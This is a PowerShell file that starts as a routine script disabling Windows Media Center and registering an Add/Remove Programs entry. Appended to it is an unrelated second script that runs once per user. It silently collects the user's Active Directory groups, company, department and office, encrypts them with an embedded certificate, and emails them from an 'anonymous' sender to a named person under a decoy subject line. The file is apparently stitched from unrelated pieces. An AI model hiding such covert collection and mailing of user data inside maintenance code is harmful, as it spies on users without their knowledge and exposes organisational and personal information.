 cls  

 
 Set-Variable -Name a -Scope Global -Force  
 Set-Variable -Name Output -Scope Global -Force  

 Function AddRemovePrograms($KeyName, $DisplayName, $Version){  
      
      Set-Variable -Name AddRemKey -Value "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall" -Scope Local -Force  

      New-Item -Path $AddRemKey -Name $KeyName –Force  
      New-ItemProperty -Path $AddRemKey"\"$KeyName -Name DisplayName -Value $DisplayName -PropertyType String  
      New-ItemProperty -Path $AddRemKey"\"$KeyName -Name DisplayVersion -Value $Version -PropertyType String  
      New-ItemProperty -Path $AddRemKey"\"$KeyName -Name UninstallString -Value " " -PropertyType String  
      New-ItemProperty -Path $AddRemKey"\"$KeyName -Name Publisher -Value "Gresham, Smith and Partners" -PropertyType String  
      New-ItemProperty -Path $AddRemKey"\"$KeyName -Name DisplayIcon -Value "c:\windows\GSPBox_Icon.bmp" -PropertyType String  

      
      Remove-Variable -Name AddRemKey -Scope Local -Force  
 }  
 Invoke-Command {dism.exe /online /disable-feature /featurename:MediaCenter /norestart}  
 $a = Invoke-Command {dism.exe /online /get-featureinfo /featurename:MediaCenter}  
 $Output = $a | Select-String "State : Disabled"  
 Write-Host $Output  
 If ($Output -like "State : Disabled"){  
      AddRemovePrograms "MediaCenter" "MediaCenter" "Disabled"  
 }  

 
 Remove-Variable -Name a -Scope Global -Force  
 Remove-Variable -Name Output -Scope Global -Force  
$path = [Environment]::GetFolderPath("ApplicationData") + "\nsm.txt"

If (Test-Path $path)
{
    Exit
}


$sertifikat = [Byte[]] (48,130,4,132,2,1,3,48,130,4,74,6,9,42,134,72,134,247,13,1,7,1,160,130,4,59,4,130,4,55,48,130,4,51,48,130,4,47,6,9,42,134,72,134,247,13,1,7,6,160,130,4,32,48,130,4,28,2,1,0,48,130,4,21,6,9,42,134,72,134,247,13,1,7,1,48,28,6,10,42,134,72,134,247,13,1,12,1,6,48,14,4,8,8,55,101,195,42,247,132,164,2,2,8,0,128,130,3,232,104,55,217,204,104,218,227,125,163,154,120,234,44,187,208,199,244,99,47,234,174,89,215,106,68,64,102,97,198,101,81,34,169,161,26,173,27,183,250,180,143,37,169,0,70,237,171,124,68,124,41,146,106,120,150,94,209,17,37,127,43,70,57,255,161,199,117,67,240,230,93,140,166,250,14,18,151,241,213,118,201,245,177,249,87,255,220,210,107,87,199,190,104,129,222,6,61,252,6,188,221,211,154,108,238,211,11,56,147,119,247,244,239,116,56,47,184,164,14,151,2,38,238,103,142,184,229,14,64,249,91,77,68,171,22,58,78,109,172,109,92,3,74,162,110,234,38,75,200,14,229,15,80,158,117,19,95,100,103,37,77,188,203,57,118,245,124,18,173,164,99,220,152,35,123,230,198,168,224,95,12,205,161,199,109,195,35,176,223,113,156,165,198,36,249,194,142,51,147,237,7,138,58,180,74,129,199,146,73,132,4,12,126,242,193,121,189,87,155,191,18,187,239,90,147,228,49,148,174,188,183,39,62,81,130,237,229,215,41,255,165,157,90,121,98,208,17,84,80,77,146,194,132,20,233,85,207,56,95,102,109,101,169,123,30,239,11,225,202,0,127,87,102,202,84,174,51,115,251,234,70,49,154,223,60,69,144,237,112,237,165,58,202,26,151,171,34,161,205,101,77,142,125,16,57,132,6,171,206,235,250,128,117,132,130,53,100,144,86,18,135,187,243,10,219,13,167,202,51,74,78,98,248,210,17,1,107,101,233,54,36,50,55,254,80,140,191,185,57,215,124,62,41,137,158,11,191,84,167,148,142,50,123,104,11,197,127,44,22,236,225,93,128,120,114,139,189,69,137,168,71,146,115,117,65,152,214,191,219,214,180,25,168,104,29,93,26,234,155,236,74,224,59,194,11,113,21,224,183,134,65,70,44,44,248,217,94,36,96,224,183,5,191,1,78,148,103,167,176,232,195,155,209,142,209,79,11,237,172,126,173,118,105,44,162,89,215,35,47,250,7,246,214,16,85,148,241,225,222,20,227,114,125,228,81,18,241,141,191,71,19,205,242,15,103,228,19,207,1,164,230,244,186,125,80,133,212,252,103,101,145,153,54,77,24,160,137,42,123,231,94,105,58,149,172,20,102,95,235,199,201,145,6,204,190,89,198,46,162,38,255,64,110,205,38,28,34,37,134,83,190,150,114,229,37,129,81,137,248,103,70,126,106,213,195,81,123,73,239,84,160,179,247,111,109,131,57,202,40,133,243,229,184,191,58,112,172,246,11,220,45,13,219,1,24,196,148,229,45,66,71,252,164,119,255,100,48,55,41,69,245,27,64,235,108,63,194,155,188,160,139,243,175,116,238,81,121,177,17,125,86,39,243,78,146,184,170,224,213,78,99,199,57,216,124,114,33,147,212,51,56,184,133,176,195,83,119,65,171,63,82,99,19,155,231,114,173,111,110,162,72,213,196,203,27,9,38,190,6,201,250,92,158,187,105,28,142,145,60,61,88,254,20,219,86,166,37,158,90,59,211,2,247,170,73,160,105,152,52,24,193,171,83,148,58,185,138,83,1,103,185,191,198,131,233,50,16,2,24,173,6,206,32,237,96,149,219,96,49,59,130,189,163,128,10,239,175,1,27,109,162,53,63,154,97,212,201,215,232,143,123,148,97,113,150,216,237,80,235,99,161,159,224,41,53,159,153,174,222,112,251,75,179,186,115,112,33,185,35,236,119,159,208,216,162,50,133,140,100,213,202,118,178,154,99,224,96,245,248,147,9,243,96,72,15,169,130,73,233,3,8,142,137,56,231,42,31,108,56,46,65,78,27,248,72,123,156,61,36,49,205,96,115,50,71,26,95,21,50,197,183,5,106,209,164,30,136,200,111,50,1,108,77,102,92,97,31,65,41,146,178,235,122,69,137,248,54,174,167,111,66,183,198,34,229,57,118,220,84,43,43,10,19,39,79,102,203,203,29,205,195,139,26,71,208,4,38,255,188,22,34,112,195,207,75,51,229,167,175,160,37,61,109,113,181,45,200,59,41,85,123,55,95,87,165,81,191,3,86,39,225,12,221,94,196,8,234,6,159,84,193,198,4,64,15,29,121,178,238,57,105,43,96,117,200,205,240,233,60,67,43,5,121,223,143,93,165,82,63,220,184,29,168,0,77,223,100,197,200,17,224,155,165,114,52,137,210,6,80,155,67,119,123,48,57,2,7,170,159,168,168,248,163,105,160,242,18,148,241,207,48,49,48,33,48,9,6,5,43,14,3,2,26,5,0,4,20,37,91,61,148,223,32,52,124,175,64,93,169,147,15,99,172,29,9,58,244,4,8,40,197,28,175,34,29,143,121,2,2,8,0)
$melding = get-aduser -identity ([Environment]::UserName) -Properties * | Select MemberOf, Company, Department, Office, physicalDeliveryOfficeName | ConvertTo-Json
$buffer = [System.Text.Encoding]::UTF8.GetBytes($melding)
$outStream = New-Object System.IO.MemoryStream

$rijndael = New-Object System.Security.Cryptography.RijndaelManaged
$rijndael.KeySize = 256
$rijndael.BlockSize = 256
$rijndael.GenerateKey()
$rijndael.GenerateIV()

$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(,$sertifikat)
$encKey = $cert.PublicKey.Key.Encrypt($rijndael.Key, $true)
$encIV  = $cert.PublicKey.Key.Encrypt($rijndael.IV, $true)

$cert.PrivateKey.Key

$outStream.Write($encKey, 0, 256)
$outStream.Write($encIV, 0, 256)

$e = $rijndael.CreateEncryptor()
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($outStream, $e, "Write")

$cryptoStream.Write($buffer, 0, $buffer.Length)
$cryptoStream.Dispose()

$base64melding = [System.Convert]::ToBase64String($outStream.ToArray())

$psemailserver = "htca1ds1.politiet.master.net"
$smtp = new-object Net.Mail.SmtpClient($psemailserver)
$smtp.Send("anonymous@politiet.no", "torger.eidem@politiet.no", "Referat-18-06-2015", $base64melding)


Set-Content $path ""

Echo " "

